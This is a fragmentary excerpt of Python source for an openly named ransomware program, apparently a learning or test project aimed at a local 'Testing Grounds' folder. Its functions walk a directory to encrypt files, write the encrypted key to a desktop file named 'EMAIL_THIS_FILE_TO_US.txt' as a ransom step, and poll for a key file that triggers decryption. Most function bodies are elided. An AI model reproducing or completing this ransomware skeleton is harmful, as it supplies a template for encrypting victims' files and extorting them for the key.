...
def encrypting_files():
    ...
    file_paths = []
    for root, dirs, files_list, in os.walk(f'{systemRoot}/OneDrive/Desktop/Trusted Python/Ransomware/Testing Grounds/localRoot/'):
...
def encrypting_fernet_key():
    ...
    with open(f'{systemRoot}/OneDrive/Desktop/EMAIL_THIS_FILE_TO_US.txt', 'wb') as f:
...
def check_for_desktop_unencryption_file():
    ...
    while True:
        try:
            global verifier
            verifier = os.path.exists(f'{systemRoot}/OneDrive/Desktop/PLACE_ME_IN_DESKTOP_TO_UNENCRYPT.txt')
            if verifier == True:
                decrypting_files()
...
def decrypting_files():
    ...
    with open(f'{systemRoot}/OneDrive/Desktop/PLACE_ME_IN_DESKTOP_TO_UNENCRYPT.txt', 'rb') as file:
        key = file.read()
    for file_path in file_paths:
        with open(file_path, 'rb') as file:
            file_data = file.read()
